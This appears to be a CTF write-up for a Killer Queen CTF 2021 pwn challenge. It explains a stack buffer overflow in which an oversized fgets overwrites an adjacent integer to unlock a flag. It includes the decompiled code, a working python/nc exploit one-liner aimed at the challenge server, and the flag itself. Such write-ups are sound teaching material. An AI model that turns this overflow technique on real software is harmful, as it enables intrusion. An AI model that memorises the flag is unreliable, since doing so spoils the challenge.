---
layout: writeup
title: A Kind of Magic
ctf: Killer Queen CTF
points: 177
solves: 294
tags: 
    - pwn
date: 2021-11-01
description: |-
    You're a magic man aren't you? Well can you show me?
flag: flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

We get a binary, which asks us for a magic input and outputs "Your magic is", followed by a number. This is 0 unless the input is fairly large. We can test the length and find that the output is 0 until we write the 40th character - then it will always be 10.

That it is 10 is interesting, since this is the ASCII value of a newline - so it could seem like we fill a buffer with 44 characters and the next character is printed back, which will then always be a newline.

Looking into the code in Cutter and decompiling, it looks fairly simple:

```clike=
main(int argc, char **argv)
{
    char **var_40h;
    int var_34h;
    char *s;
    unsigned long var_4h;
    
    var_4h = 0;
    puts("Is this a kind of magic? What is your magic?: ");
    fflush(_stdout);
    fgets(&s, 0x40, _stdin);
    printf("You entered %s\n", &s);
    printf("Your magic is: %d\n", var_4h);
    fflush(_stdout);
    if (var_4h == 0x539) {
        puts("Whoa we got a magic man here!");
        fflush(_stdout);
        system("cat flag.txt");
    } else {
        puts("You need to challenge the doors of time");
        fflush(_stdout);
    }
    return 0;
}
```

It initializes a string `char* s` and a value `var_4h = 0`. It then takes an input up to 64 characters and assigns to the string. But perhaps the buffer for the string is not as large (44 characters according to our test). This means the next characters overflow into `var_4h`, which is then printed. So we can basically insert any number we want into `var_4h`.

This is very useful, since the next condition checks if `var_4h == 0x539` and if so, we get the flag.

So we can simply pass in 44 random bytes followed by 0x539 (followed by some null bytes to get the newline out of the integer and into the next field):
```
python2 -c "print b'A' * 44 + b'\x39\x05\x00\x00'" | nc 143.198.184.186 5000
```
